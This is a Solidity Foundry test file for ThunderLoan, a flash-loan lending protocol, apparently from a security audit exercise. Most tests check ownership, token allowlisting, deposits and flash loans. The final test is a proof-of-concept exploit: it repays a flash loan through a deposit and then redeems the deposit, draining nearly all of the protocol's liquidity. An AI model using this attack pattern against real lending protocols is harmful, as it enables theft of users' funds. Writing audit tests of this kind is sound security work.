// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    /* LOGS: ADRESSES */
    function test_addresses() public view {
        console.log("este contrato: ", address(this));
        console.log("thunderLoan:   ", address(thunderLoan));
        console.log("thunderLoan:   ", thunderLoan.owner());
        console.log("Receiver:      ", address(mockFlashLoanReceiver));
        console.log("weth:          ", address(weth));
        console.log("tokenA:        ", address(tokenA));
        console.log("liqProvider:   ", liquidityProvider);
        console.log("user:          ", user);
        /**
         *   este contrato:  0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
         *   thunderLoan:    0xc7183455a4C133Ae270771860664b6B7ec320bB1
         *   thunderL Ow:    0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
         *   Receiver:       0x1cF5c39A1828B446da31fADb01059F2A6B9B327b
         *   weth:           0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
         *   tokenA:         0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
         *   liqProvider:    0x000000000000000000000000000000000000007B
         *   user:           0x00000000000000000000000000000000000001c8
         */
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        console.log("token A:    ", address(tokenA));
        console.log("assetToken: ", address(assetToken));
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
        assertEq(tokenA.balanceOf(address(asset)), asset.balanceOf(liquidityProvider));
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getbalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    function test_FlashLoanCouldBeFooledUsingDeposit() external setAllowedToken hasDeposits {
        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);

        console.log("blocked: ", thunderLoan.blocked());

        // 1.- Mint tokenA small amount for fees:
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);

        /* LOGS */
        console.log("*** LOGS BEFORE OPERATIONS ***");
        console.log("user balance:         ", tokenA.balanceOf(user));
        console.log("mockcontract balance:", tokenA.balanceOf(address(mockFlashLoanReceiver)) / 1e18);
        console.log("protocol balance:  ", tokenA.balanceOf(address(asset)) / 1e18);

        // 2.- Store the current protocol amount to steal:
        uint256 protocolTotalBalance = tokenA.balanceOf(address(asset));
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, protocolTotalBalance);

        // 3.- Execute the attack:
        vm.startPrank(user);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, protocolTotalBalance, "");
        uint256 mockFlashLoanReceiverBalance = asset.balanceOf(address(mockFlashLoanReceiver));
        mockFlashLoanReceiver.redeem(tokenA, mockFlashLoanReceiverBalance - calculatedFee);
        vm.stopPrank();

        /* LOGS */
        console.log("*** LOGS AFTER OPERATIONS ***");
        console.log("user balance:      ", tokenA.balanceOf(user) / 1e18);
        console.log("protocol balance:     ", tokenA.balanceOf(address(asset)) / 1e18);

        // 4.- Check:
        // User current balance aprox to protocolTotalBalance + AMOUNT - fees:
        assertGt(tokenA.balanceOf(address(user)), protocolTotalBalance);
        // Protocol balance aprox to 0 + fees:
        assertEq(tokenA.balanceOf(address(asset)) / 1e18, 1);
    }
}
